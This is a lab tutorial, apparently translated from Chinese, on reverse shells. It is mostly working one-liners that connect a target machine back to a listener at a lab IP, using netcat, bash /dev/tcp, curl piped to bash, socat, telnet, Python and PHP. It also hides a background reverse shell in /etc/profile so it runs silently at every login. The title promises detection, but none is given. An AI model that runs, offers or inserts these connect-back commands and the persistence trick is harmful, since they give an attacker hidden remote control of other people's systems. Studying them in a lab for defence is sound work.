---
title: 'Reverse shells: connection direction and detection'
translation_id: reverse-shells
source_digest: f35c103f2fdbc228455a457e765a564f17819c0f942198d16389a9cae3c8a7d0
tags:
  - Linux
  - Reverse Shell
  - Bash
  - Netcat
categories:
  - Cybersecurity
  - Security Labs
sections: {"what-is-a-reverse-shell": "什么是反弹shell", "when-connection-direction-matters": "适用情况", "implementations": "实现方式", "netcat": "利用-netcat-反弹shell", "preparation": "准备", "listener": "攻击机开启监听", "connection-from-the-remote-host": "目标机主动连接攻击机", "bash": "利用-bash-反弹-shell", "preparation-2": "准备-2", "command": "命令", "explanation": "详细解释", "curl-and-bash": "curl-配合-bash", "preparing-indexphp": "1-准备-indexphp-文件", "listener-setup": "2-攻击机打开-23333-端口的监听", "client-side-request": "3-目标机输入-curl-命令反弹-shell", "shell-startup-files": "bash-反弹命令写入-etcprofile-文件", "illustration": "如图", "procedure": "布置的步骤", "socat": "利用-socat-反弹-shell", "downloading-socat": "下载-socat", "listener-2": "攻击机开启监听-2", "connecting-with-socat": "目标机通过-socat-建立连接", "telnet": "利用-telnet-反弹-shell", "python": "用-python-脚本反弹-shell", "php": "用-php-脚本反弹-shell", "closing-notes": "最后"}
---

# What is a reverse shell?

In a direct connection, the initiating machine connects to a port on the remote host. Web servers, SSH and remote desktop are familiar examples.

Sometimes it is impossible to reach the remote machine directly. A connection initiated in the other direction behaves differently.

In a reverse connection, the remote host initiates the connection to a listener. In the shell examples, command input and output then travel over that connection.

# When connection direction matters

The notes consider the following network conditions:
- A firewall may allow outgoing requests while blocking incoming connections.
  - The target can still open an outbound connection to the listening port on the attacking machine, giving the attacker a shell.

- A local port on the remote host may already be occupied.
  - The attacker can choose an available listening port on their own machine.

- The attacker may not know when the target will encounter a virus or Trojan, what network it will be on, or when it will be powered on.
  - In that scenario, the attacker leaves a listener running and tricks the target into executing a program that connects back with a shell.

- The machine may be on a private network or its IP address may change.
  - A directly reachable address may not be available.

# Implementations

Which reverse-shell method works depends on what’s available on the remote host.
For example:
- If netcat, Socat or Telnet is installed, you can use that tool for the connection.
- If Bash is available, it can make the connection itself.
- A Python or PHP interpreter can also run a script that does the same thing.

## Netcat

**Netcat** (nc) is a small Unix utility for making TCP and UDP connections.

### Preparation

At the time of these notes, many Linux distributions shipped with a netcat package.

Some versions omitted the -e option.
I assumed that was a security precaution: -e lets netcat attach a local shell directly to the connection.

For this test I installed a version with the option:
```
wget https://jaist.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz
tar -xvzf netcat-0.7.1.tar.gz
./configure
make && make install
make clean
```

### Listener

> Syntax: `nc -lvvp <listener-port>`

`netcat -lvvp 23333`
![image-20250615012933906](https://res.cloudinary.com/sycamore/image/upload/v1792696696/Typora/2025/06/074dea0aeb65e3cf991579314a98284c.png)

### Connection from the remote host

> Syntax: `nc <listener-IP> <listener-port> -e /bin/bash`

`netcat 192.168.158.139 23333 -e /bin/bash`
![image-20250615012929850](https://res.cloudinary.com/sycamore/image/upload/v1792696696/Typora/2025/06/f52bbdd3389beb7c7a9e9da72e220e40.png)

The listener has to be running before the target connects back.

Here’s the resulting shell:
![image-20250615012926374](https://res.cloudinary.com/sycamore/image/upload/v1792696698/Typora/2025/06/9284a9b2e6290d96a8b65313b24f91a3.png)


## Bash

This version uses Bash network redirection.

### Preparation

The default shell on my Kali installation was zsh.
Use `echo "$SHELL"` to see which login shell is configured for the current user.
![image-20250615012919215](https://res.cloudinary.com/sycamore/image/upload/v1792696699/Typora/2025/06/8d5285fdf9ee6db10ebba4ce645ad92c.png)

I switched shells for the test:
- Change the login shell: `chsh -s /bin/bash`
- Reboot: `reboot`
![image-20250615012915317](https://res.cloudinary.com/sycamore/image/upload/v1792696700/Typora/2025/06/a9c9ebe071eae7546dacb18ebc0bb277.png)

**Note:** The error below occurred because the listener wasn’t running.
![image-20250615012907770](https://res.cloudinary.com/sycamore/image/upload/v1792696700/Typora/2025/06/8854676b35906672629c5fc26ad8a02f.png)


Some Debian builds may also have Bash network redirection disabled by default.

In that case I rebuilt Bash with `--enable-net-redirections`.
I wrote up the build separately in [Rebuilding Bash for network redirection](/en/system/linux/building-bash/).

### Command

I started a local listener on the receiving machine first.
> Syntax: `bash -i >& /dev/tcp/<listener-IP>/<listener-port> 0>&1`

`bash -i >& /dev/tcp/192.168.158.139/23333 0>&1`

**The connection worked:**
On the target, which initiated the connection:
![image-20250615012903048](https://res.cloudinary.com/sycamore/image/upload/v1792696702/Typora/2025/06/c693896f2e2fa73809cee178b0f6533b.png)

On the listening machine:
![image-20250615012858851](https://res.cloudinary.com/sycamore/image/upload/v1792696703/Typora/2025/06/6fb9f5e48c00f60ba91673a9f6c734eb.png)

### Explanation

- `bash -i`
	- Starts an interactive Bash shell.
- `>&`
	- Joins the streams before the operator and redirects them to the destination after it.
- `/dev/tcp/192.168.158.139/23333`
	- Bash recognises the special path /dev/tcp/ip/port.
	- In this example it opens a TCP connection from the target to port 23333 on the listening host, 192.168.158.139.
- `0>&1`
	- 0 and 1 are file descriptors.
	- Here standard input (0) is redirected to the same destination as standard output (1). That is how the connection carries both input and output.

### Curl and Bash

Here’s another way I tried the Bash version.
The curl command uses a shell pipeline.

#### Preparing index.php

I created an index.php file on the listening machine.
Its contents were the command I’d previously run on the target for the Bash connection:
> bash -i >& /dev/tcp/192.168.158.139/23333 0>&1

I saved it under the web root.
On my Kali guest running Apache2, that directory was /var/www/html/.

After starting Apache2, I found an index.php in that directory.
I could replace its contents directly. It just supplied the page shown below.
![image-20250615012853268](https://res.cloudinary.com/sycamore/image/upload/v1792696703/Typora/2025/06/97eb1b3565e6f8745bf100a9b5ee31ed.png)

#### Listener setup

Command: `netcat -lvvp 23333`

#### Client-side request

Command: `curl 192.168.158.139|bash`

Here’s what that looked like:
![image-20250615012839981](https://res.cloudinary.com/sycamore/image/upload/v1792696704/Typora/2025/06/66bf859ff6c462a364624b51a215fd64.png)

The reverse connection succeeded:
![](https://res.cloudinary.com/sycamore/image/upload/v1792696706/Typora/2025/06/01742775f569ce91fa25a5f8f25ed544.png)

### Shell startup files

The /etc/profile file runs when a Bash login shell starts.

#### Illustration

> I’d typed the command incorrectly in this screenshot, so starting Bash printed an error.
> ![image-20250615012821415](https://res.cloudinary.com/sycamore/image/upload/v1792696707/Typora/2025/06/92211d839dd171dc8f115e037f1e07eb.png)
> Even with the correct command, I still got an error if the receiving machine wasn’t listening:
> ![image-20250615012825282](https://res.cloudinary.com/sycamore/image/upload/v1792696708/Typora/2025/06/566b0ca11a943f96d0bf550e848d84d4.png)

#### Procedure

I edited the file with `vim /etc/profile`:
![image-20250615012816962](https://res.cloudinary.com/sycamore/image/upload/v1792696709/Typora/2025/06/6a8db3c08c0188c7b0a9b1d25fed3c50.png)


- I appended `/bin/bash -i >& /dev/tcp/192.168.158.139/23333 0>&1 &`.
> The extra ampersand at the end runs the command in the background.
> That leaves the login shell available to the user.

![image-20250615012812596](https://res.cloudinary.com/sycamore/image/upload/v1792696712/Typora/2025/06/bf591833811a31c67bcfb2741ab7ca30.png)

**Test run**
- I started the listener on port 23333.
- In Xshell I opened a session on the target, starting Bash.
![image-20250615012807425](https://res.cloudinary.com/sycamore/image/upload/v1792696712/Typora/2025/06/1fe57f518c02b5c5651dc8fbfe3269c7.png)
- Nothing was echoed in the login session, and the listener received a shell.
![image-20250615012804072](https://res.cloudinary.com/sycamore/image/upload/v1792696713/Typora/2025/06/5d329939a4e8d82c53c712f4b54adb09.png)


## Socat

**Socat** is a multipurpose networking utility for Linux, similar to netcat.
I used it on both ends of the reverse connection.

### Downloading Socat

My Kali installation already had Socat. On a machine without it, the first step was to install it.
The installation command was `apt-get install socat`.

### Listener

Command: `socat TCP-LISTEN:23333 -`
![image-20250615012759404](https://res.cloudinary.com/sycamore/image/upload/v1792696714/Typora/2025/06/f6ffc230be89565c17383bbe1e8262a3.png)

### Connecting with Socat

Command: `socat tcp-connect:192.168.158.139:23333 exec:'bash -li',pty,stderr,setsid,sigint,sane`
![image-20250615012754642](https://res.cloudinary.com/sycamore/image/upload/v1792696716/Typora/2025/06/00614ff7b3a1a2dfdfbad02dc0df8be1.png)

The resulting shell:
![image-20250615012750258](https://res.cloudinary.com/sycamore/image/upload/v1792696723/Typora/2025/06/7b31e1aa07c5c4bdcbd9e6cafad1655a.png)


## Telnet

Sometimes neither Netcat nor /dev/tcp is available on the target.
If Telnet is installed, it offers another way to connect back.

- Start a listener on the receiving host.
Either nc or socat works.
- Run the command on the target to open the connection:
`mknod a p; telnet 47.xxx.xxx.72 2333 0<a | /bin/bash 1>a`
![image-20250615012739427](https://res.cloudinary.com/sycamore/image/upload/v1792696717/Typora/2025/06/db443fe2827a018ce3cb046f63793326.png)
- The resulting shell:
![image-20250615012732507](https://res.cloudinary.com/sycamore/image/upload/v1792696722/Typora/2025/06/d3d507d38eb37d836868b42d5f90db17.png)

## Python

This version uses Python’s socket library.

With the listener running, I used this command:
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.158.139",23333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
I could also save the same Python as a .py file and run it from the command line.

Here’s the setup:
![image-20250615012727025](https://res.cloudinary.com/sycamore/image/upload/v1792696722/Typora/2025/06/ff1cae7c81c0b04929f2c86b0e788c9e.png)
The reverse shell connected successfully:
![image-20250615012721830](https://res.cloudinary.com/sycamore/image/upload/v1792696724/Typora/2025/06/6826b2f0cec7b82a3677a2e1e86de378.png)

## PHP

I started the listener and ran the following PHP script on the target:
```
php -r '$sock=fsockopen("192.168.158.139",23333);exec("/bin/sh -i <&3 >&3 2>&3");'
```
Here’s the result:
![image-20250615012715771](https://res.cloudinary.com/sycamore/image/upload/v1792696729/Typora/2025/06/fdd3929e8cec1fc5e67af1614f47d9b4.png)
![image-20250615012702683](https://res.cloudinary.com/sycamore/image/upload/v1792696730/Typora/2025/06/c830f507fd2cc729beb4e10b7a5d18cd.png)

## Closing notes
After trying these approaches, I found that they all came back to the same idea.

Whether implemented in a tool or a script, the basic pieces are a connection and redirection of input and output.

Working through the examples made a principle that had seemed rather vague to me much clearer.
